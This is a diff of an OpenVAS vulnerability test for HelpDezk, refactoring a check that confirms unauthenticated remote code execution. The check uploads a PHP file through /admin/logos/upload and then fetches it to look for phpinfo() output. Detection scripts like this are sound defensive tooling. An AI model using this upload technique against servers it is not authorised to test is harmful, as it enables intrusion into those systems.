@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_helpdezk_multiple_vuln_mar15.nasl 11466 2018-09-19 09:23:32Z cfischer $
+# $Id: gb_helpdezk_multiple_vuln_mar15.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # HelpDezk Multiple Vulnerabilities - Mar15
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805296");
-  script_version("$Revision: 11466 $");
+  script_version("$Revision: 13994 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-19 11:23:32 +0200 (Wed, 19 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2015-03-03 15:53:33 +0530 (Tue, 03 Mar 2015)");
   script_name("HelpDezk Multiple Vulnerabilities - Mar15");
 
@@ -82,32 +82,30 @@ include("http_keepalive.inc");
 include("misc_func.inc");
 
 http_port = get_http_port(default:80);
-if(!can_host_php(port:http_port)){
+if(!can_host_php(port:http_port))
   exit(0);
-}
 
-vtstring = get_vt_string();
 host = http_host_name( port:http_port );
 
-foreach dir (make_list_unique("/", "/helpdezk", "/helpdezk-community",  cgi_dirs(port:http_port)))
-{
+foreach dir (make_list_unique("/", "/helpdezk", "/helpdezk-community",  cgi_dirs(port:http_port))) {
 
-  if( dir == "/" ) dir = "";
+  if( dir == "/" )
+    dir = "";
 
-  url = dir + '/admin/login';
+  url = dir + "/admin/login";
+  rcvRes = http_get_cache(item: url, port:http_port);
+  if(rcvRes && ">helpdezk-community" >< rcvRes && ">HelpDEZK" >< rcvRes) {
 
-  sndReq = http_get(item: url, port:http_port);
-  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
-
-  if(rcvRes && ">helpdezk-community" >< rcvRes && ">HelpDEZK" >< rcvRes)
-  {
+    # nb: Used to get a current/valid cookie
+    sndReq = http_get(item: url, port:http_port);
+    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
     cookie = eregmatch(pattern:"(PHPSESSID=[a-z0-9]+)" , string:rcvRes);
 
-    ##Create a file and Upload file
     url = dir + '/admin/logos/upload';
-    fileName = vtstring + '_' + rand() + '.php';
 
-    ##File is created as 'top_' prefix
+    vtstrings = get_vt_strings();
+    fileName = vtstrings["lowercase_rand"] + ".php";
+
     createdFile = 'top_' + fileName;
 
     postData = string('-----------------------------18670385921040103471088135293\r\n',
@@ -128,9 +126,8 @@ foreach dir (make_list_unique("/", "/helpdezk", "/helpdezk-community",  cgi_dirs
     if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
        pattern:"title>Index", extra_check:createdFile))
     {
-      ## Uploaded file URL
-      url = dir + '/app/uploads/logos/' + createdFile;
 
+      url = dir + '/app/uploads/logos/' + createdFile;
       if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
          pattern:">phpinfo\(\)<", extra_check:">PHP Documentation<"))
       {
